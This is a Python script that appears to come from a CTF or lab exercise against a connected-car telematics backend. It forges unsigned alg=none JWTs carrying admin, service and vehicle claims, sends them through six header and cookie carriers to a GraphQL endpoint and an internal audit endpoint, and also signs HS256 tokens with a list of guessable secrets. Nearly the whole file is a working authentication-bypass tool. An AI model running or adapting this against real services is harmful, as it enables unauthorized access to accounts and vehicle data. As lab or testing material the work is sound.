#!/usr/bin/env python3
"""
T01 — forge an `alg=none` JWT and see whether the TSP leaves the guest branch.

Why this is the right move (evidence: 03_EVIDENCE/tsp/0170_platform_stage_fallbacks.txt):
  q1-ota-package   : "利用云端 IDOR 读取测试车 OTA 包和历史 PCAP 附件"
  q2-service-token : "从 OTA 包中提取开发态 JWT，并利用 alg=none 分支伪造服务账号凭据"
  => the TSP has a JWT verifier with an `alg=none` bypass, and there is an
     authenticated branch that the 81-byte "Guest demo vehicle" response is NOT.

Baseline to beat:
  POST /graphql        -> 200  81 B  {"data":{"vehicles":[{"label":"Guest demo vehicle",...}]}}
  GET  /internal/audit -> 404  22 B  {"error":"not found"}
Any response whose bytes differ from its baseline is a hit.

Read-only: only forged tokens of our own, no credential guessing against real accounts.
"""
import base64
import hashlib
import hmac
import json
import sys
import time

import requests

BASE = "http://10.230.164.2:8080"
GQL = BASE + "/graphql"
AUDIT = BASE + "/internal/audit"

CANON_GQL = b'{"data":{"vehicles":[{"label":"Guest demo vehicle","vin":"CV6000000DEMO0001"}]}}\n'
CANON_AUDIT = b'{"error":"not found"}\n'

VIN = "CV6FF52FEE9EDDD86"
DEMOVIN = "CV6000000DEMO0001"

S = requests.Session()
S.headers.update({"Content-Type": "application/json",
                  "User-Agent": "tsp-probe/1.0"})


def b64(d):
    return base64.urlsafe_b64encode(
        json.dumps(d, separators=(",", ":")).encode()).rstrip(b"=").decode()


def jwt(header, payload, sig=b""):
    h = b64(header)
    p = b64(payload)
    s = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
    return f"{h}.{p}.{s}"


def hs256(header, payload, secret):
    h = b64(header)
    p = b64(payload)
    signing_input = f"{h}.{p}".encode()
    sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
    return f"{h}.{p}." + base64.urlsafe_b64encode(sig).rstrip(b"=").decode()


NOW = int(time.time())

HEADERS = [
    ("alg-none", {"alg": "none"}),
    ("alg-none-typ", {"alg": "none", "typ": "JWT"}),
    ("alg-None", {"alg": "None"}),
    ("alg-NONE", {"alg": "NONE"}),
    ("alg-none-kid", {"alg": "none", "typ": "JWT", "kid": "tsp"}),
]

CLAIM_SETS = [
    ("empty", {}),
    ("sub-guest", {"sub": "guest"}),
    ("sub-admin", {"sub": "admin"}),
    ("sub-service", {"sub": "service"}),
    ("sub-tsp", {"sub": "tsp"}),
    ("role-admin", {"role": "admin"}),
    ("roles-admin", {"roles": ["admin"]}),
    ("scope-admin", {"scope": "admin"}),
    ("scope-svc", {"scope": "tsp.service"}),
    ("aud-tsp", {"aud": "tsp"}),
    ("iss-tsp", {"iss": "tsp"}),
    ("svc", {"svc": "tsp"}),
    ("service-true", {"service": True}),
    ("internal-true", {"internal": True}),
    ("admin-true", {"admin": True}),
    ("vin-real", {"vin": VIN}),
    ("vin-demo", {"vin": DEMOVIN}),
    ("full-admin", {"sub": "admin", "role": "admin", "scope": "admin:write",
                    "iss": "tsp", "aud": "tsp", "iat": NOW, "exp": NOW + 86400}),
    ("full-svc", {"sub": "tsp-service", "role": "service", "scope": "internal",
                  "iss": "tsp", "aud": "tsp", "iat": NOW, "exp": NOW + 86400}),
    ("full-veh", {"sub": "vehicle", "vin": VIN, "role": "vehicle",
                  "iss": "tsp", "iat": NOW, "exp": NOW + 86400}),
    ("jwt-standard", {"iss": "cybercar", "sub": "service", "aud": "tsp",
                      "exp": NOW + 86400, "iat": NOW, "nbf": NOW - 60}),
    ("tenant", {"tenant": "internal", "role": "admin"}),
    ("user_id-1", {"user_id": 1, "role": "admin"}),
    ("uid-admin", {"uid": "admin", "role": "admin"}),
]

CARRIERS = [
    ("authorization-bearer", lambda t: {"Authorization": "Bearer " + t}),
    ("authorization-raw", lambda t: {"Authorization": t}),
    ("cookie-session", lambda t: {"Cookie": "cybercar_session=" + t}),
    ("cookie-token", lambda t: {"Cookie": "token=" + t}),
    ("x-auth-token", lambda t: {"X-Auth-Token": t}),
    ("x-service-token", lambda t: {"X-Service-Token": t}),
]

HS256_SECRETS = [b"", b"secret", b"cybercar", b"tsp", b"guest", b"changeme",
                 b"jwt", b"dev"]


def check(tag, headers, token_desc):
    """Return list of (endpoint, status, body) that deviate from baseline."""
    hits = []
    for name, url, method, canon, body in (
            ("gql", GQL, "POST", CANON_GQL, b"{}"),
            ("audit", AUDIT, "GET", CANON_AUDIT, None)):
        try:
            if method == "POST":
                r = S.post(url, data=body, headers=headers, timeout=15)
            else:
                r = S.get(url, headers=headers, timeout=15)
        except Exception as e:
            hits.append((name, f"EXC {type(e).__name__}", b""))
            continue
        if r.content != canon or r.status_code not in (200, 404):
            hits.append((name, f"{r.status_code} len={len(r.content)}", r.content[:300]))
            print(f"  *** HIT {name} {r.status_code} len={len(r.content)}")
            print(f"      carrier/token: {token_desc}")
            print(f"      body: {r.content[:300]!r}")
    return hits


def main():
    print("=" * 78)
    print("baseline")
    r = S.post(GQL, data=b"{}")
    print(f"  POST /graphql        -> {r.status_code} {len(r.content)}B")
    r = S.get(AUDIT)
    print(f"  GET  /internal/audit -> {r.status_code} {len(r.content)}B")
    print()
    print("=" * 78)
    print(f"alg=none JWT matrix: {len(HEADERS)} headers x {len(CLAIM_SETS)} claims "
          f"x {len(CARRIERS)} carriers x 2 endpoints")
    print("=" * 78)
    n = 0
    hits = []
    for hname, hdr in HEADERS:
        for cname, claims in CLAIM_SETS:
            tok = jwt(hdr, claims)
            tok_nosig = tok.rstrip(".")          # 2-part variant
            for carrier, fn in CARRIERS:
                for variant, t in (("3part", tok), ("2part", tok_nosig)):
                    hh = dict(fn(t))
                    hh["Content-Type"] = "application/json"
                    n += 1
                    hits += check(f"{hname}/{cname}/{carrier}/{variant}", hh,
                                  f"{hname}/{cname}/{carrier}/{variant} tok={t[:60]}…")
    print(f"  requests: {n}  hits: {len(hits)}")

    print()
    print("=" * 78)
    print("HS256 with guessable secrets (in case the bypass is HMAC, not none)")
    print("=" * 78)
    hdr = {"alg": "HS256", "typ": "JWT"}
    n2 = 0
    for sec in HS256_SECRETS:
        for cname, claims in (("empty", {}), ("admin", {"sub": "admin", "role": "admin"}),
                              ("svc", {"sub": "service", "role": "service"})):
            t = hs256(hdr, claims, sec)
            n2 += 1
            hh = {"Authorization": "Bearer " + t, "Content-Type": "application/json"}
            hits += check(f"hs256/{sec!r}/{cname}", hh, f"HS256 secret={sec!r} {cname}")
    print(f"  requests: {n2}  total hits: {len(hits)}")

    print()
    print("=" * 78)
    if hits:
        print(f"RESULT: {len(hits)} deviation(s) found — investigate above")
        for h in hits:
            print(" ", h)
    else:
        print("RESULT: no deviation. alg=none forgery alone does not leave the guest branch.")
    print("=" * 78)


if __name__ == "__main__":
    main()
